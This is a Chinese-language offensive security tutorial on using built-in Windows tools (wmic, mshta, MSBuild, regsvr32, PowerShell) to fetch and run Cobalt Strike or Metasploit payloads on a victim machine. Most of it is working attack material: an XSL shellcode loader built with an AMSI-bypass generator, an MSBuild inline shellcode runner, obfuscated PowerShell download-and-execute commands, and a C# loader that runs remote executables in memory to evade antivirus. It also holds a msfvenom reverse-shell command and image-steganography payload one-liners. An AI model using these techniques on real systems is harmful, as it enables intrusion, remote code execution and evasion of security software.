# Wmic

wmic是一款Microsoft工具，它提供一个wmi命令行界面，用于本地和远程计算机的各种管理功能，以及wmic查询，例如系统设置、停止进程和本地或远程运行脚本。因此，它可以调用XSL脚本来执行。可以通过xsl脚本来执行命令，脚本一般用jscript编写。先编写一个xsl脚本，然后放到VPS上，受害机执行下面命令会远程下载并执行xsl的内容。

```cmd
C:\Users\Desktop>wmic os get /format:"http://172.21.66.218:8080/a.xsl"
<?xml version="1.0" encoding="UTF-16"?>0
```

通过安装[AMSI_bypass.cna](https://github.com/Ridter/AMSI_bypass/blob/master/AMSI_bypass.cna)重启cs后attack->AMSI bypass Web Delivery(s)生成a.xsl，生成的代码大致逻辑如下

```xml
<?xml version='1.0'?>
<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
xmlns:msxsl="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">
<msxsl:script language="JScript" implements-prefix="user">
var binary = "rundll32.exe";
var code = "XXX";
function setversion() {
var shell = new ActiveXObject('WScript.Shell');
ver = 'v4.0.30319';
try {
shell.RegRead('HKLM\\SOFTWARE\\Microsoft\\.NETFramework\\v4.0.30319\\');
} catch(e) {
ver = 'v2.0.50727';
}
shell.Environment('Process')('COMPLUS_Version') = ver;
}
function debug(s) {}
function base64ToStream(b) {
var enc = new ActiveXObject("System.Text.ASCIIEncoding");
var length = enc.GetByteCount_2(b);
var ba = enc.GetBytes_4(b);
var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
ba = transform.TransformFinalBlock(ba, 0, length);
var ms = new ActiveXObject("System.IO.MemoryStream");
ms.Write(ba, 0, (length / 4) * 3);
ms.Position = 0;
return ms;
}
function shellcode() {
var serialized_obj = "XXX";
var entry_class = 'cactusTorch';
try {
setversion();
var stm = base64ToStream(serialized_obj);
var fmt = new ActiveXObject('System.Runtime.Serialization.Formatters.Binary.BinaryFormatter');
var al = new ActiveXObject('System.Collections.ArrayList');
var n = fmt.SurrogateSelector;
var d = fmt.Deserialize_2(stm);
al.Add(n);
var o = d.DynamicInvoke(al.ToArray()).CreateInstance(entry_class);
o.flame(binary,code);
} catch (e) {
debug(e.message);
}
return 0;
}
</msxsl:script>
<xsl:template match="/">
<xsl:value-of select="user:shellcode()"/>
</xsl:template>
</xsl:stylesheet>
```

# mshta

mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。可以使用Microsoft MSHTA.exe工具解析JavaScript或VBScript的HTML文件。

编写一个脚本，加载上面wmic讲的的a.xsl，为了没那么明显，后缀名改为png，mshta同样会把他当成hta文件解释运行。脚本可以通过[AMSI_bypass.cna](https://github.com/Ridter/AMSI_bypass/blob/master/AMSI_bypass.cna)生成a.xsl时勾选use hta one liner

```html
<HTML>
<HEAD>
</HEAD>
<BODY>
<script language="javascript" >
var xml = new ActiveXObject("Microsoft.XMLDOM");
xml.async = false;
var xsl = xml;
xsl.load("http://172.19.105.41:8080/a.xsl");
xml.transformNode(xsl);
self.close();
</script>
</body>
</html>
```

后面就跟wmic一样上线。

```cmd
C:\Users\Desktop>mshta http://172.19.105.41:8080/a.png
```

# MSBUILD

MSBuild是Microsoft Build Engine的缩写，代表Microsoft和Visual Studio的新的生成平台。MSBuild可在未安装Visual Studio的环境中编译.net的工程文件。MSBuild可编译特定格式的xml文件。windows下的msbuild命令可以执行内容为特定格式的文件。在.NET Framework 4.0中支持了一项新功能”Inline Tasks”，被包含在元素UsingTask中，可用来在xml文件中执行c#代码。参考：[Use MSBuild To Do More](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)

[Xml的脚本](https://github.com/3gstudent/msbuild-inline-task)，需要把executes shellcode.xml的shellcode改成cs的c#的payload，并且修改byte长度。

```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <!-- This inline task executes shellcode. -->
  <!-- C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe SimpleTasks.csproj -->
  <!-- Save This File And Execute The Above Command -->
  <!-- Author: Casey Smith, Twitter: @subTee --> 
  <!-- License: BSD 3-Clause -->
  <Target Name="Hello">
    <ClassExample />
  </Target>
  <UsingTask
    TaskName="ClassExample"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
    <Task>
      <Code Type="Class" Language="cs">
      <![CDATA[
        using System;
        using System.Runtime.InteropServices;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample :  Task, ITask{         
          private static UInt32 MEM_COMMIT = 0x1000;          
          private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;          
          [DllImport("kernel32")]
            private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
            UInt32 size, UInt32 flAllocationType, UInt32 flProtect);          
          [DllImport("kernel32")]
            private static extern IntPtr CreateThread(            
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId           
            );
          [DllImport("kernel32")]
            private static extern UInt32 WaitForSingleObject(           
            IntPtr hHandle,
            UInt32 dwMilliseconds
            );          
          public override bool Execute(){
              byte[] shellcode  = new byte[XXX] { c# shellcode };//修改这里
              UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
              MEM_COMMIT, PAGE_EXECUTE_READWRITE);
              Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
              IntPtr hThread = IntPtr.Zero;
              UInt32 threadId = 0;
              IntPtr pinfo = IntPtr.Zero;
              hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
              WaitForSingleObject(hThread, 0xFFFFFFFF);
              return true;
          } 
        }     
      ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>
```

使用msbuild命令必须在指定的文件夹下，版本必须得是4.0。关闭Windows Defender运行32位MSBuild命令

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319>MSBuild "C:\Users\Desktop\executes shellcode.xml"
Microsoft(R) 生成引擎版本 4.7.2046.0
[Microsoft .NET Framework 版本 4.0.30319.42000]
版权所有 (C) Microsoft Corporation。保留所有权利。

生成启动时间为 2022/1/24 22:42:43。
```

# regsvr32

Regsvr32命令用于注册COM组件，是 Windows 系统提供的用来向系统注册控件或者卸载控件的命令，以命令行方式运行。WinXP及以上系统的regsvr32.exe在windows\system32文件夹下；2000系统的regsvr32.exe在winnt\system32文件夹下。

- /u 取消注册
- /s 指定 regsvr32 安静运行，在成功注册/反注册DLL文件的前提下不显示结果提示框。
- /n 指定不调用 DllRegisterServer。此选项必须与 /i 共同使用。
- /i:cmdline 调用 DllInstall 将它传递到可选的 [cmdline]。

```cmd
C:\Users>regsvr32 /u /n /s /i:http://192.168.211.1/a.png scrobj.dll
```

后面的dll文件名不能更改。这个文件可以是任意后缀名，文件内容格式得是xml格式的：

```xml
<?XML version="1.0"?>
<scriptlet>
<registration         
progid="Pentest"       
classid="{F0001111-0000-0000-0000-0000FEEDACDC}" >
<script language="JScript">
<![CDATA[   
var r = new ActiveXObject("WScript.Shell").Run("cmd /k whoami"); 
]]>
</script>
</registration>
</scriptlet>
```

# POWSHELL

本地执行powershell

```powershell
powershell.exe -ExecutionPolicy Bypass -file rgb.ps1
```

远程加载脚本并进行参数的混淆。

```powershell
powershell.exe -nop -w hidden -c "$c1='IEX(New-Object Net.WebClient).123'.Replace('123','Downlo');$c2='adString(''httaaa.101.120:80/a'')'.Replace('aaa','p://172.19');IEX ($c1+$c2)"
```

powershell是一个exe程序，可以执行自己的命令或者powershell脚本。其实powershell的本质就是解释器，类似于python。python解释器通过解释了python脚本来调用操作系统给予的各种底层函数；powershell通过解释powershell脚本，来调用System.Management.Automation.dll。

System.Management.Automation是.NET 框架下的一个assembly类。而c#语言可以将所谓的c#“脚本”解释后来调用.NET框架下所有的assembly。因此我们可以用c#实现powershell的功能。这在当powershell被某些策略禁用的时候十分好用。

assembly类可以加载byte[]类型的数据到内存中并当作一个assembly文件去执行。assembly文件就是c#写的dll文件与exe文件。然而还有函数可以将远程的exe文件下载到本地并用byte[]格式去保存。

这两个方式结合后就可以实现[下载远程c#文件到内存中直接执行](https://github.com/shanfenglan/sflcsharp-assembly)，可以绕过绝大多数杀软。

```c#
using System;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Reflection;

namespace demo1{
    class Program{
        static void Main(string[] args){
            string fileDownloadurl = null;
            string filedownloadtype = null;
            byte[] filebuffer = null;
            try{
                fileDownloadurl = args[1];
                filedownloadtype = args[0];
            }
            catch{
                Console.WriteLine("\n加载远程exe文件到内存执行：sflcsharp.exe -b exe文件的url");
                Console.WriteLine("\n加载远程base64密文文件到内存执行：为sflcsharp.exe -b64 b64文件的url");
                Environment.Exit(0);
            }
            if (filedownloadtype == "-b"){
                filebuffer = Downloadbinarypefilebyhttp(fileDownloadurl);
            }
            if (filedownloadtype == "-b64"){
                filebuffer = downloadbase64(fileDownloadurl);
            }
            if (filebuffer != null){
                Console.WriteLine("正在将下载下来的程序加载到当前用户的内存中");
                Assembly assemblyinstance = Assembly.Load(filebuffer);  //将下载下来的程序加载到当前用户的内存中
                Console.WriteLine("正在寻找程序入口点并执行程序");
                assemblyinstance.EntryPoint.Invoke(null,new object[] { null}); //找到程序的入口点并执行程序
                Console.WriteLine("\n程序执行完毕");
            }
        }
        public static byte[] Downloadbinarypefilebyhttp(string url){
            Console.WriteLine("\n创建WebClient类用来下载PE文件");
            WebClient downloadwebclient = new WebClient();  //这个类可以从指定url上下载或者上传数据
            Console.WriteLine("\n下载文件后自动保存为byte[]格式\n");
            byte[] test = downloadwebclient.DownloadData(url);
            return test;
        }
        public static byte[] downloadbase64(string url){
            Console.WriteLine("\n创建WebClient类用来下载base64密文文件，下载到的数据按照字符串格式保存在内存");
            WebClient downloadwebclient = new WebClient();  //这个类可以从指定url上下载或者上传数据
            string b64 = downloadwebclient.DownloadString(url);
            Console.WriteLine("将base64字符串转换为byte[]类型的数据");
            byte[] test = Convert.FromBase64String(b64);
            return test;
        }
    }
}
```

通过[工具](https://github.com/shanfenglan/sflcsharp-assembly)下载远程文件到内存中直接执行

```cmd
C:\Users\root\Desktop>sflcsharp.exe -b http://192.168.211.1/artifact.exe
```

# RGB隐写上线

使用嵌入方法，每个像素中2个颜色值的最低有效4位用于保存有效负载。

1. 使用cs生成payload.ps1或者适用msf生成

   ```bash
   root@kali:~/# msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.253.8 LPORT=5555 -f psh-reflection > payload.ps1
   ```

2. 受害机器上设置执行策略

   ```powershell
   PS C:\Users\root\Desktop\Invoke-PSImage-master> Set-ExecutionPolicy Unrestricted -Scope CurrentUser
   ```

3. 导入Invoke-PSImage.ps1文件

   ```powershell
   PS C:\Users\root\Desktop\Invoke-PSImage-master> Import-Module .\Invoke-PSImage.ps1
   ```

4. 生成 shellcode 的图片和上线命令

   ```powershell
   PS C:\Users\root\Desktop\Invoke-PSImage-master> Invoke-PSImage -Script .\payload.ps1 -Out .\evil.png -Image .\1.png -Web
   sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://example.com/evil.png"));$o=a Byte[] 3780;(0..14)|%{foreach($x in(0..251)){$p=$g.GetPixel($x,$_);$o[$_*252+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3538]))
   ```

5. 把这个图片上传到服务器，并修改代码的ip执行就可以上线。

   ```powershell
   PS C:\Users\root\Desktop\Invoke-PSImage-master> sal a New-Object;Add-Type -A System.Drawing;$g=a System.Drawing.Bitmap((a Net.WebClient).OpenRead("http://192.168.211.1/evil.png"));$o=a Byte[] 3780;(0..14)|%{foreach($x in(0..251)){$p=$g.GetPixel($x,$_);$o[$_*252+$x]=([math]::Floor(($p.B-band15)*16)-bor($p.G -band 15))}};IEX([System.Text.Encoding]::ASCII.GetString($o[0..3538]))
   ```







# 免杀